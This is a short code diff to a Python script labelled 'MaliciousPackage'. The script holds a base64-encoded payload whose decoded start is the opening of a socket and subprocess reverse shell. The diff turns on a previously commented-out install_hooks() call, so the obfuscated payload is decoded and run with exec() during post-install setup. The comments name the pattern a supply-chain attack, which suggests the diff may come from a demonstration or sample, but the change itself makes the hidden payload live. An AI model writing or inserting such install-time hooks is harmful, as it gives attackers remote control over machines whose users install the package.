@@ -10,9 +10,11 @@ encoded_payload = "aW1wb3J0IHNvY2tldCxvcyxzdWJwcm9jZXNzO3M9c29ja2V0LnNvY2tldCgpO
 def install_hooks():
     # Dynamic decoding and execution - classic supply chain attack pattern
     decoded_command = base64.b64decode(encoded_payload).decode('utf-8')
-    # eval / exec trigger
     exec(decoded_command)
 
 if __name__ == "__main__":
     print("[MaliciousPackage] Executing post-install setup hooks...")
-    # install_hooks()
+    try:
+        install_hooks()
+    except Exception as e:
+        print(f"[Hook Error] {e}")
